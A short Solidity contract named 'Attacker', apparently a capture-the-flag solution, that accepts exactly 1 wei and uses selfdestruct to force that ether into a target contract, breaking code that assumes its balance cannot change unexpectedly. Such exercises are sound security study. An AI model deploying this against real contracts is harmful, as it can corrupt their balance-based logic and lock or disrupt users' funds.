pragma solidity ^0.4.21;

contract Attacker {
    
    constructor() public payable {
        require(msg.value == 1 wei) ;
    }
    
    function destroy(address _targetAddress) public payable {
        selfdestruct(_targetAddress);
    }

}
